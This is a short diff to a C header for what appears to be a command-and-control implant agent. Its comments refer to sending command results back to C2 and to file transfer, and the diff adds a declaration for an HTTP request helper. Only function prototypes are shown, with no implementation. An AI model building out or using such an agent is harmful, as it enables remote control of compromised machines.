@@ -35,6 +35,10 @@ void       tasks_free(AgentTask *tasks, int count);
 
 // Send command result back to C2.
 void agent_send_result(long long task_id, const char *output, const char *error);
+int  agent_http_do(const char *method, const char *path,
+                   const uint8_t *body, size_t body_len,
+                   const char *extra_hdr,
+                   uint8_t **resp_out, size_t *resp_len, int *status);
 void agent_send_result_admin(long long task_id, const char *output, const char *error, int is_admin);
 
 // File transfer
